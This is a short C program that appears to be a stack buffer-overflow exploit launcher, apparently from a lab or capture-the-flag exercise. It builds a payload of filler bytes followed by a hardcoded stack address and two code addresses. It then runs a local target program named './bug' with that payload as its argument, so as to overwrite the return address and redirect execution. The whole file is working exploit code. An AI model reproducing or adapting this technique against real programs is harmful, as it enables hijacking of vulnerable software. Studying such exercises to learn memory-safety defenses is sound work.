#include <stdio.h>
char code[] = "0123456789ABCDEF"
"abcdabcd"
"\x38\xfe\xff\xbf"
"\x9a\x84\x04\x08"
"\xd7\x84\x04\x08";
int main()
{
	char* arg[3]; 
	arg[0] = "./bug";
	arg[1] = code; 
	arg[2] = NULL;
	execve(arg[0], arg, NULL); 
	return 0;
}
